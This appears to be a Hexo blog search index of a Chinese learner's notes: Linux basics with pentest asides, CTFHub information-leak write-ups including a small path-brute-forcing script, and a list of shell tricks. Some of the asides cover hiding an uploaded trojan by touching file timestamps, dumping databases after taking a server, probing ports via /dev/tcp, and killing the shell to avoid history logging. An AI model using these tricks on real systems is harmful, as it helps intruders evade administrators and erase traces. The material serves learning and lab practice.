<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>linux基础命令</title>
      <link href="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>Linux命令是用于实现某一类功能的指令或者程序，其命令的执行依赖于解释器程序，如bin/bash。</p><h6 id="内部命令：安装系统能执行的命令，shell解析器部分，比如ls、cat、cd。"><a href="#内部命令：安装系统能执行的命令，shell解析器部分，比如ls、cat、cd。" class="headerlink" title="内部命令：安装系统能执行的命令，shell解析器部分，比如ls、cat、cd。"></a>内部命令：安装系统能执行的命令，shell解析器部分，比如ls、cat、cd。</h6><h6 id="外部命令：安装web应用程序的命令，大部分时对安装程序进行操作的。"><a href="#外部命令：安装web应用程序的命令，大部分时对安装程序进行操作的。" class="headerlink" title="外部命令：安装web应用程序的命令，大部分时对安装程序进行操作的。"></a>外部命令：安装web应用程序的命令，大部分时对安装程序进行操作的。</h6><h3 id="Linux命令的通用格式为："><a href="#Linux命令的通用格式为：" class="headerlink" title="Linux命令的通用格式为："></a>Linux命令的通用格式为：</h3><pre><code>命令关键字[选项] [参数]选项及参数含义：   -选项：用于调节命令的具体功能   -以“-”引导短格式选项（单个字符），比如“-l”   -以“--”引导长格式选项（多个字符），比如“--color”   -多个段格式选项可以写在一起，用一个“-”引导，比如“-al”参数：命令操作的对象，如文件、目录名等</code></pre><p>举例子，<code>ls -al /home</code>查看home目录信息。</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715152508816.png" alt="image-20230715152508816"></p><h3 id="Linux命令行编辑的几个辅助操作包括："><a href="#Linux命令行编辑的几个辅助操作包括：" class="headerlink" title="Linux命令行编辑的几个辅助操作包括："></a>Linux命令行编辑的几个辅助操作包括：</h3><p>tab键：自动补全</p><p>反斜杠“ \”:强制换行</p><p>快捷键ctrl + U：清空至行首</p><p>快捷键ctrl + K ：清空至行尾</p><p>快捷键ctrl + L ：清屏，类似于clear</p><p>快捷键ctrl + C：取消本次命令编辑，强制中断程序的执行</p><p>快捷键ctrl + Z ：强制中断任务</p><h3 id="常见的Linux命令"><a href="#常见的Linux命令" class="headerlink" title="常见的Linux命令"></a>常见的Linux命令</h3><h4 id="命令：help"><a href="#命令：help" class="headerlink" title="命令：help"></a>命令：help</h4><p>Linux内部帮助命令是help，其基本使用方法如下：</p><ul><li>help</li></ul><p>查看Bash内部命令的帮助信息</p><ul><li>命令 –help</li></ul><p>查看外部命令帮助信息，适合大多数外部命令</p><ul><li>使用man命令阅读手册页</li></ul><p>使用“↑”、“↓”方向键滚动文本，使用Page Up和Page Down键翻页，按Q或q键退出阅读环境，按“/”键后查看内容</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715155028075.png" alt="image-20230715155028075"></p><h4 id="命令：uname"><a href="#命令：uname" class="headerlink" title="命令：uname"></a>命令：uname</h4><p>查看系统相关信息，常见命令选项：</p><p>-a ：显示主机名、内核版本、硬件平台等详细信息</p><p>-r ： 显示内核版本号</p><p><code>提权中可能会碰到uname命令。提权一般基于内核的本地溢出提权，如果想本地溢出，首先需要看到本地版本号</code></p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715155950449.png" alt="image-20230715155950449"></p><h4 id="命令：hostname"><a href="#命令：hostname" class="headerlink" title="命令：hostname"></a>命令：hostname</h4><p>查看系统主机名，包括主机名称，所在域的名称</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715160722996.png" alt="image-20230715160722996"></p><h4 id="命令：ifconfig"><a href="#命令：ifconfig" class="headerlink" title="命令：ifconfig"></a><strong>命令：ifconfig</strong></h4><p>查看系统IP信息</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715160820826.png" alt="image-20230715160820826"></p><h4 id="命令：cat-proc-cpuinfo"><a href="#命令：cat-proc-cpuinfo" class="headerlink" title="命令：cat  /proc/cpuinfo"></a>命令：<strong>cat  /proc/cpuinfo</strong></h4><p>查看CPU信息</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715161430568.png" alt="image-20230715161430568"></p><h4 id="命令：cat-proc-meminfo"><a href="#命令：cat-proc-meminfo" class="headerlink" title="命令：cat  /proc/meminfo"></a>命令：cat  /proc/meminfo</h4><p>查看内存信息</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715161559159.png" alt="image-20230715161559159"></p><h4 id="2-目录操作命令-ls-cd-du-mkdir"><a href="#2-目录操作命令-ls-cd-du-mkdir" class="headerlink" title="2.目录操作命令 ls/cd/du/mkdir"></a>2.目录操作命令 ls/cd/du/mkdir</h4><h5 id="命令：pwd"><a href="#命令：pwd" class="headerlink" title="命令：pwd"></a>命令：pwd</h5><p>查看目录工具</p><h5 id="命令：cd"><a href="#命令：cd" class="headerlink" title="命令：cd"></a>命令：cd</h5><p>切换工作目录，其格式为：cd [目录位置]</p><p>相对路径</p><p>绝对路径</p><h5 id="命令：ls"><a href="#命令：ls" class="headerlink" title="命令：ls"></a>命令：ls</h5><p>用途：列表显示目录内容</p><p>ls [目录或文件名]</p><ul><li>-l：以长格式显示</li><li>-a：显示所有子目录和文件的信息，包括隐藏文件</li><li>-A：类似于“-a”，但不显示“.”和“…”目录的信息</li><li>-d：显示目录本身的属性</li><li>-h：以更易读的字节单位（K、M等）显示信息</li><li>-R：递归显示内容</li><li>–color：以颜色区分不同类型文件</li></ul><h5 id="常用组合：ls-al"><a href="#常用组合：ls-al" class="headerlink" title="常用组合：ls -al"></a>常用组合：ls -al</h5><p>在Linux系统中，ls相当于DOS命令中的dir，Linux的隐藏文件前面有个点“ .test” ,具体如下：</p><pre><code>ls查看当前目录ls /查看根目录或者文件ls -al查看文件所有信息，包括隐藏文件，并以长格式显示ls -lh /查看文件大小，以长格式显示</code></pre><p>在web渗透中，我们常用“ls  -al”命令查看文件的权限信息。</p><h4 id="命令：du"><a href="#命令：du" class="headerlink" title="命令：du"></a>命令：du</h4><p>用途：主要用于查看文件大小，统计目录及文件的空间占用情况（Eatimate file space usage）。</p><p>格式：du [选项]… [目录或文件名]</p><p>常用格式选项：</p><ul><li>-a：统计时包括所有的文件，而不仅仅只统计目录</li><li>-h：以更易读的字节单位（K、M等）显示信息</li><li>-s：只统计每个参数所占用空间总的大小</li></ul><h6 id="常用组合：du-sh"><a href="#常用组合：du-sh" class="headerlink" title="常用组合：du -sh"></a>常用组合：du -sh</h6><p>当我们拿到服务器之后，需要对源码进行打包或数据库进行脱库，如果库太大，Sqlmap可能会跑崩，可以尝试du查看大小“du -sh /”，再用“gzip”压缩打包下载</p><h4 id="命令：mkdir"><a href="#命令：mkdir" class="headerlink" title="命令：mkdir"></a>命令：mkdir</h4><p>用途：常见命令，用于创建新的目录</p><p>格式：mkdir [-p] [/路径]目录名</p><p>常用命令：递归创建目录mkdir -p /csdn/eastmount</p><p>当我们调用“mkdir  /cdsn/eastmount ”时会报错，因为跟目录下没有“csdn”目录。如果想要连续递归创建多个目录，则需要增加“-p”参数，即“mkdir -p</p><p>/csdn/eastmount”</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715225441390.png" alt="image-20230715225441390"></p><p>如果想要连续创建两个目录，则使用如下方法：</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715225556094.png" alt="image-20230715225556094"></p><h4 id="3-文件操作命令touch-vim-cp-rm-mv-find"><a href="#3-文件操作命令touch-vim-cp-rm-mv-find" class="headerlink" title="3.文件操作命令touch/vim/cp/rm/mv/find"></a>3.文件操作命令touch/vim/cp/rm/mv/find</h4><h4 id="命令：touch"><a href="#命令：touch" class="headerlink" title="命令：touch"></a>命令：touch</h4><p>用途：新建空文件，或更新文件时间标记</p><p>格式：touch 文件名</p><p>如果文件不存在则创建文件；如果文件存在，该命令的另一个作用是更新日期。在web渗透中，该命令可以硬核的帮助我们创建文件或隐藏东西。比如我们上传了一个木马，它会有相应的新建日期，管理员很容易发现这些异常文件或信息。我们可以尝试将所有文件都更新到最新日期，调用“touch /var/www/html/*”命令实现，但其效果肯定不好，后面随着深入，会分享更好的方法</p><p>   <img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715231549659.png" alt="image-20230715231549659">        </p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715231810225.png" alt="image-20230715231810225"></p><h4 id="命令：ln"><a href="#命令：ln" class="headerlink" title="命令：ln"></a>命令：ln</h4><p>用途：为文件或目录创建链接，即快捷方式</p><p>格式：ln [-s]源文件或目录..链接文件或目标目录</p><p>常用格式选项：</p><p>-s：建立符号链接文件</p><h4 id="命令：cp"><a href="#命令：cp" class="headerlink" title="命令：cp"></a>命令：cp</h4><p>用途：复制文件或目录</p><p>格式：cp [选项] …源文件目录或目录  目录文件或目标目录</p><p>常用格式选项：</p><p>-r：递归复制整个目录树</p><p>-p：保持源文件的属性不变</p><p>-f：强制覆盖目标同名文件或目录,根目录是略过目录时使用。</p><p>-i：需要覆盖文件或目录时进行提醒</p><p>复制文件至指定位置：cp test.txt/var/www/html/</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716111138655.png" alt="image-20230716111138655"></p><p>如果我们需要复制目录的话，需要增加一个递归复制参数“-r” ，比如： cp -r cdsn /var/www/html/</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716111950239.png" alt="image-20230716111950239"></p><h4 id="命令：rm"><a href="#命令：rm" class="headerlink" title="命令：rm"></a>命令：rm</h4><p>用途：删除文件或目录</p><p>格式：rm [选项] .. 文件或目录</p><p>常用格式选项：</p><p>-f：强制删除文件或目录，不进行提醒</p><p>-i：删除文件或目录时提醒用户确认</p><p>-r: 递归删除整个目录树</p><p>常用命令：递归强制删除整个目录rm-rf，但需慎用</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716113119175.png" alt="image-20230716113119175"></p><h4 id="命令：mv"><a href="#命令：mv" class="headerlink" title="命令：mv"></a>命令：mv</h4><p>用途：移动文件或目录，相当于剪切，如果目标位置与源位置相同，相当于重命名</p><p>格式：mv [选项] …源文件或目录  目标文件或目录</p><p>移动至“csdn”文件夹，如：mv  yl.txt/csdn</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716133231434.png" alt="image-20230716133231434"></p><p>重命名文件，如：mv  yl.txt  test.txt</p><p>命令：find</p><p>用途：用于查找文件或目录，取证也常用该命令</p><p>格式：find [查找范围] [查找条件]</p><p>常用格式选项：</p><p>-name: 按文件名称查找</p><p>-size：按文件大小查找</p><p> -user：按文件属性查找</p><p>-type：按文件类型查找</p><p>通过名字查某目录下所有文件，如：find  /etc -name  “m*.conf”,注意“*”表示通配符</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716231407108.png" alt="image-20230716231407108"></p><p>查找网站根目录下哪些文件是root，如：find / -user root</p><p>在Web渗透中，当某人上传文件并修改为root权限，我们管理员可以通过该命令查找来发现可疑文件，判断服务器是否被攻击。</p><p>4.文本编辑查看命令vim/cat/wc</p><p>命令：vi</p><p>用途：该命令是一个较大的UNIX命令</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub</title>
      <link href="/2023/07/12/ctfhub/"/>
      <url>/2023/07/12/ctfhub/</url>
      
        <content type="html"><![CDATA[<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><h6 id="1-有两层目录，一个一个试，一共有4-4种尝试方式，找到flag-txt"><a href="#1-有两层目录，一个一个试，一共有4-4种尝试方式，找到flag-txt" class="headerlink" title="1.有两层目录，一个一个试，一共有4*4种尝试方式，找到flag.txt"></a>1.有两层目录，一个一个试，一共有4*4种尝试方式，找到flag.txt</h6><p><img src="/2023/07/12/ctfhub/image-20230713092337772.png" alt="image-20230713092337772"></p><h6 id="2-用python脚本"><a href="#2-用python脚本" class="headerlink" title="2.用python脚本"></a>2.用python脚本</h6><pre><code># 访问目录遍历，/1/1,/1/2，，，/4/4，读取响应有无flag.txt，有则输出目录路径import requestsurl = &quot;http://challenge-df1916128f6a845f.sandbox.ctfhub.com:10800/flag_in_here/&quot;for i in range(1, 5):    for j in range(1, 5):        url1 = url + str(i) + &quot;/&quot; + str(j) + &quot;/flag.txt&quot;        # 读取响应页面中有无flag.txt，有则打印url        if &quot;ctfhub&#123;&quot; in requests.get(url1).text:            #直接打出flag.txt的内容            print(requests.get(url1).text)            break</code></pre><h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><h6 id="ctrl-F-查找关键字flag"><a href="#ctrl-F-查找关键字flag" class="headerlink" title="ctrl+F 查找关键字flag"></a>ctrl+F 查找关键字flag</h6><p><img src="/2023/07/12/ctfhub/image-20230713161017017.png" alt="image-20230713161017017"></p><h3 id="备份文件下载-网站源码"><a href="#备份文件下载-网站源码" class="headerlink" title="备份文件下载-网站源码"></a>备份文件下载-网站源码</h3><p><img src="/2023/07/12/ctfhub/image-20230713161337694.png" alt="image-20230713161337694"></p><h3 id><a href="#" class="headerlink" title></a></h3><h6 id="常见的一些网站源码下载文件后缀和文件名。"><a href="#常见的一些网站源码下载文件后缀和文件名。" class="headerlink" title="常见的一些网站源码下载文件后缀和文件名。"></a>常见的一些网站源码下载文件后缀和文件名。</h6><h6 id="1-使用dirsearsh扫描"><a href="#1-使用dirsearsh扫描" class="headerlink" title="1.使用dirsearsh扫描"></a>1.使用dirsearsh扫描</h6><h6 id="2-访问www-zip文件"><a href="#2-访问www-zip文件" class="headerlink" title="2.访问www.zip文件"></a>2.访问<a href="http://www.zip文件/">www.zip文件</a></h6><p><img src="/2023/07/12/ctfhub/image-20230713164646825.png" alt="image-20230713164646825"></p><h6 id="打开记事本，发现"><a href="#打开记事本，发现" class="headerlink" title="打开记事本，发现"></a>打开记事本，发现</h6><p><img src="/2023/07/12/ctfhub/image-20230713164750008.png" alt="image-20230713164750008"></p><h6 id="尝试再网站上访问，得到flag"><a href="#尝试再网站上访问，得到flag" class="headerlink" title="尝试再网站上访问，得到flag"></a>尝试再网站上访问，得到flag</h6><p><img src="/2023/07/12/ctfhub/image-20230713165051679.png" alt="image-20230713165051679"></p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>1.根据提示访问index.php.bak文件</p><p><img src="/2023/07/12/ctfhub/image-20230713170128212.png" alt="image-20230713170128212"></p><p>下载并查看</p><p><img src="/2023/07/12/ctfhub/image-20230713170638785.png" alt="image-20230713170638785"></p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><h6 id="原理：在开发人员使用‘vim编辑器’编辑文本时，系统会自动生成一个备份文件，当编辑完成后，保存时，元文件会更新，备份文件会被自动删除。"><a href="#原理：在开发人员使用‘vim编辑器’编辑文本时，系统会自动生成一个备份文件，当编辑完成后，保存时，元文件会更新，备份文件会被自动删除。" class="headerlink" title="原理：在开发人员使用‘vim编辑器’编辑文本时，系统会自动生成一个备份文件，当编辑完成后，保存时，元文件会更新，备份文件会被自动删除。"></a>原理：在开发人员使用‘vim编辑器’编辑文本时，系统会自动生成一个备份文件，当编辑完成后，保存时，元文件会更新，备份文件会被自动删除。</h6><p>但是当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p><p>以index.php为例</p><p>第一次产生的交换文件名为 <code>.index.php.swp</code></p><p>再次意外退出后，将会产生的交换文件名为 <code>.index.php.swo</code></p><p>第三次产生的交换文件名 <code>.index.php.swn</code></p><p>这些隐藏文件的作用：<code>可用来恢复意外退出文件</code></p><h6 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h6><p><code>swp</code>备份文件就是隐藏文件，操作时需要在文件名前<code>.</code></p><p>针对<code>swp</code>备份文件，可以使用vim -r filename命令来恢复文件</p><p>（<code>vim</code>使用的缓存存储为一种固定的二进制文件。而一般编辑的字符是明文可见字符，在vim的缓存中这些可见字符会原样保留，所以显示出来的是乱码。）</p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title="DS_Store"></a>DS_Store</h3><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><pre><code>访问url/.DS_Store</code></pre><p>下载DS_Store文件</p><p>把文件放入Linux里面，cat里面有文件路径</p><h3 id="git-泄露"><a href="#git-泄露" class="headerlink" title="git 泄露"></a>git 泄露</h3><h4 id="log"><a href="#log" class="headerlink" title="log"></a>log</h4><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将<code>.git</code>文件夹直接部署到线上环境。这就引起了git 泄露漏洞。</p><p>GitHack是一个<code>.git</code>泄露利用测试脚本，通过泄露文件，还原重建工程源代码。</p><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>1.解析<code>.git/index</code>文件，找到工程中所有的:(文件名，文件)</p><p>2.去<code>.git/objects/</code>文件夹下下载对应的文件</p><p>3.<code>zlib</code>解压文件，按原始的目录结构写入源代码</p><p>优点</p><p>速度快，默认20个工作线程</p><p>尽量还原所有</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/06/22/1.%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F%E5%92%8C%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/06/22/1.%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F%E5%92%8C%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="1-命令格式和基础命令"><a href="#1-命令格式和基础命令" class="headerlink" title="1.命令格式和基础命令"></a>1.命令格式和基础命令</h2><p>Linux命令是用于实现某一类功能的指令或程序，其命令的执行依赖于解释器程序，如/bin/bash。</p><ul><li><strong>内部命令：</strong>安装系统能执行的命令，shell解析器部分，比如ls、cat、cd。</li><li><strong>外部命令：</strong>安装Web应用程序产生的命令，大部分是对安装程序进行操作的。</li></ul><p>Linux命令的通用格式为：</p><pre><code class="text">命令关键字 [选项] [参数]选项及参数含义：    - 选项：用于调节命令的具体功能    - 以“-”引导短格式选项（单个字符），比如“-l”    - 以“--”引导长格式选项（多个字符），比如“--color”    - 多个段格式选项可以写在一起，用一个“-”引导，比如“-al”参数：命令操作的对象，如文件、目录名等</code></pre><p>举个例子，“ls -al /home”查看home目录信息。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="shell常用命令"><a href="#shell常用命令" class="headerlink" title="shell常用命令"></a>shell常用命令</h1><p><strong>前言</strong></p><p>使用Linux  shell是一些程序员每天的基本工作，但我们经常会忘记一些有用的shell命令和技巧。当然，命令我能记住，但我不敢说能记得如何用它执行某个特定任务。需要注意一点的是，有些用法需要在你的Linux系统里安装额外的软件。下面话不多说了，来看看详细的内容吧。</p><p><strong>检查远程端口是否对bash开放：</strong></p><pre><code class="text">echo &gt;/dev/tcp/8.8.8.8/53 &amp;&amp; echo &quot;open&quot;</code></pre><p><strong>让进程转入后台：</strong></p><pre><code class="text">Ctrl + z</code></pre><p><strong>产生随机的十六进制数，其中n是字符数：</strong></p><pre><code class="text">openssl rand -hex n</code></pre><p><strong>在当前shell里执行一个文件里的命令：</strong></p><pre><code class="text">source /home/user/file.name</code></pre><p><strong>截取前5个字符：</strong></p><pre><code class="text">$&#123;variable:0:5&#125;</code></pre><p><strong>SSH debug 模式:</strong></p><pre><code class="text">ssh -vvv user@ip_address</code></pre><p><strong>SSH with pem key:</strong></p><pre><code class="text">ssh user@ip_address -i key.pem</code></pre><p><strong>用wget抓取完整的网站目录结构，存放到本地目录中：</strong></p><pre><code class="text">wget -r --no-parent --reject &quot;index.html*&quot; http://hostname/ -P /home/user/dirs</code></pre><p><strong>一次创建多个目录：</strong></p><pre><code class="text">mkdir -p /home/user/&#123;test,test1,test2&#125;</code></pre><p><strong>列出包括子进程的进程树：</strong></p><pre><code class="text">ps axwef</code></pre><p><strong>创建 war 文件:</strong></p><pre><code class="text">jar -cvf name.war file</code></pre><p><strong>测试硬盘写入速度：</strong></p><pre><code class="text">dd if=/dev/zero of=/tmp/output.img bs=8k count=256k; rm -rf /tmp/output.img</code></pre><p><strong>测试硬盘读取速度：</strong></p><pre><code class="text">hdparm -Tt /dev/sda</code></pre><p><strong>获取文本的md5 hash：</strong></p><pre><code class="text">echo -n &quot;text&quot; | md5sum</code></pre><p><strong>检查xml格式：</strong></p><pre><code class="text">xmllint --noout file.xml</code></pre><p><strong>将tar.gz提取到新目录里：</strong></p><pre><code class="text">tar zxvf package.tar.gz -C new_dir</code></pre><p><strong>使用curl获取HTTP头信息：</strong></p><pre><code class="text">curl -I http://www.example.com</code></pre><p><strong>修改文件或目录的时间戳(YYMMDDhhmm):</strong></p><pre><code class="text">touch -t 0712250000 file</code></pre><p><strong>用wget命令执行ftp下载：</strong></p><pre><code class="text">wget -m ftp://username:password@hostname</code></pre><p><strong>生成随机密码(例子里是16个字符长):</strong></p><pre><code class="text">LANG=c &lt; /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c$&#123;1:-16&#125;;echo;</code></pre><p><strong>快速备份一个文件：</strong></p><pre><code class="text">cp some_file_name&#123;,.bkp&#125;</code></pre><p><strong>访问Windows共享目录：</strong></p><pre><code class="text">smbclient -U &quot;DOMAIN\user&quot; //dc.domain.com/share/test/dir</code></pre><p><strong>执行历史记录里的命令(这里是第100行):</strong></p><pre><code class="text">!100</code></pre><p><strong>解压:</strong></p><pre><code class="text">unzip package_name.zip -d dir_name</code></pre><p><strong>输入多行文字(CTRL + d 退出):</strong></p><pre><code class="text">cat &gt; test.txt</code></pre><p><strong>创建空文件或清空一个现有文件：</strong></p><pre><code class="text">\&gt; test.txt</code></pre><p><strong>与Ubuntu NTP server同步时间：</strong></p><pre><code class="text">ntpdate ntp.ubuntu.com</code></pre><p><strong>用netstat显示所有tcp4监听端口：</strong></p><pre><code class="text">netstat -lnt4 | awk &#39;&#123;print $4&#125;&#39; | cut -f2 -d: | grep -o &#39;[0-9]*&#39;</code></pre><p><strong>qcow2镜像文件转换：</strong></p><pre><code class="text">qemu-img convert -f qcow2 -O raw precise-server-cloudimg-amd64-disk1.img \precise-server-cloudimg-amd64-disk1.raw</code></pre><p><strong>重复运行文件，显示其输出（缺省是2秒一次）：</strong></p><pre><code class="text">watch ps -ef</code></pre><p><strong>所有用户列表：</strong></p><pre><code class="text">getent passwd</code></pre><p><strong>Mount root in read/write mode:</strong></p><pre><code class="text">mount -o remount,rw /</code></pre><p><strong>挂载一个目录（这是不能使用链接的情况）:</strong></p><pre><code class="text">mount --bind /source /destination</code></pre><p><strong>动态更新DNS server:</strong></p><pre><code class="text">nsupdate &lt; &lt;EOF update add $HOST 86400 A $IP send EOF</code></pre><p><strong>递归grep所有目录：</strong></p><pre><code class="text">grep -r &quot;some_text&quot; /path/to/dir</code></pre><p><strong>列出前10个最大的文件：</strong></p><pre><code class="text">lsof / | awk &#39;&#123; if($7 &gt; 1048576) print $7/1048576 &quot;MB &quot;$9 &#125;&#39; | sort -n -u | tail</code></pre><p><strong>显示剩余内存(MB):</strong></p><pre><code class="text">free -m | grep cache | awk &#39;/[0-9]/&#123; print $4&quot; MB&quot; &#125;&#39;</code></pre><p><strong>打开Vim并跳到文件末：</strong></p><pre><code class="text">vim + some_file_name</code></pre><p><strong>Git 克隆指定分支(master):</strong></p><pre><code class="text">git clone git@github.com:name/app.git -b master</code></pre><p><strong>Git 切换到其它分支(develop):</strong></p><pre><code class="text">git checkout develop</code></pre><p><strong>Git 删除分支(myfeature):</strong></p><pre><code class="text">git clone git@github.com:name/app.git -b master</code></pre><p><strong>Git 切换到其它分支(develop):</strong></p><pre><code class="text">git checkout develop</code></pre><p><strong>Git 删除分支(myfeature):</strong></p><pre><code class="text">git branch -d myfeature</code></pre><p><strong>Git 删除远程分支</strong></p><pre><code class="text">git push origin :branchName</code></pre><p><strong>Git 将新分支推送到远程服务器：</strong></p><pre><code class="text">git push -u origin mynewfeature</code></pre><p><strong>打印历史记录中最后一次cat命令：</strong></p><pre><code class="text">!cat:p</code></pre><p><strong>运行历史记录里最后一次cat命令：</strong></p><pre><code class="text">!cat</code></pre><p><strong>找出/home/user下所有空子目录:</strong></p><pre><code class="text">find /home/user -maxdepth 1 -type d -empty</code></pre><p><strong>获取test.txt文件中第50-60行内容：</strong></p><pre><code class="text">&lt; test.txt sed -n &#39;50,60p&#39;</code></pre><p><strong>运行最后一个命令(如果最后一个命令是mkdir /root/test, 下面将会运行: sudo mkdir /root/test)：</strong></p><pre><code class="text">sudo !!</code></pre><p><strong>创建临时RAM文件系统 – ramdisk (先创建/tmpram目录):</strong></p><pre><code class="text">mount -t tmpfs tmpfs /tmpram -o size=512m</code></pre><p><strong>Grep whole words:</strong></p><pre><code class="text">grep -w &quot;name&quot; test.txt</code></pre><p><strong>在需要提升权限的情况下往一个文件里追加文本：</strong></p><pre><code class="text">echo &quot;some text&quot; | sudo tee -a /path/file</code></pre><p><strong>列出所有kill signal参数:</strong></p><pre><code class="text">kill -l</code></pre><p><strong>在bash历史记录里禁止记录最后一次会话：</strong></p><pre><code class="text">kill -9 $$</code></pre><p><strong>扫描网络寻找开放的端口：</strong></p><pre><code class="text">nmap -p 8081 172.20.0.0/16</code></pre><p><strong>设置git email:</strong></p><pre><code class="text">git config --globaluser.email &quot;me@example.com&quot; </code></pre><p><strong>To sync with master if you have unpublished commits:</strong></p><pre><code class="text">git pull --rebase origin master</code></pre><p><strong>将所有文件名中含有”txt”的文件移入/home/user目录:</strong></p><pre><code class="text">find -iname &quot;*txt*&quot; -exec mv -v &#123;&#125; /home/user \;</code></pre><p><strong>将文件按行并列显示：</strong></p><pre><code class="text">paste test.txt test1.txt</code></pre><p><strong>shell里的进度条:</strong></p><pre><code class="text">pv data.log</code></pre><p><strong>使用netcat将数据发送到Graphite server:</strong></p><pre><code class="text">echo &quot;hosts.sampleHost 10 `date +%s`&quot; | nc 192.168.200.2 3000</code></pre><p><strong>将tabs转换成空格：</strong></p><pre><code class="text">expand test.txt &gt; test1.txt</code></pre><p><strong>Skip bash history:</strong></p><pre><code class="text">&lt; space &gt;cmd</code></pre><p><strong>去之前的工作目录：</strong></p><pre><code class="text">cd -</code></pre><p><strong>拆分大体积的tar.gz文件(每个100MB)，然后合并回去：</strong></p><pre><code class="text">split –b 100m /path/to/large/archive /path/to/output/files cat files* &gt; archive</code></pre><p><strong>使用curl获取HTTP status code:</strong></p><pre><code class="text">curl -sL -w &quot;%&#123;http_code&#125;\\n&quot; www.example.com -o /dev/null</code></pre><p><strong>设置root密码，强化MySQL安全安装:</strong></p><pre><code class="text">/usr/bin/mysql_secure_installation</code></pre><p><strong>当Ctrl + c不好使时:</strong></p><pre><code class="text">Ctrl + \</code></pre><p><strong>获取文件owner:</strong></p><pre><code class="text">stat -c %U file.txt</code></pre><p><strong>block设备列表：</strong></p><pre><code class="text">lsblk -f</code></pre><p><strong>找出文件名结尾有空格的文件：</strong></p><pre><code class="text">find . -type f -exec egrep -l &quot; +$&quot; &#123;&#125; \;</code></pre><p><strong>找出文件名有tab缩进符的文件</strong></p><pre><code class="text">find . -type f -exec egrep -l $&#39;\t&#39; &#123;&#125; \;</code></pre><p><strong>用”=”打印出横线:全选复制放进笔记</strong></p><pre><code class="text">printf &#39;%100s\n&#39; | tr &#39; &#39; =</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs靶场</title>
      <link href="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/</url>
      
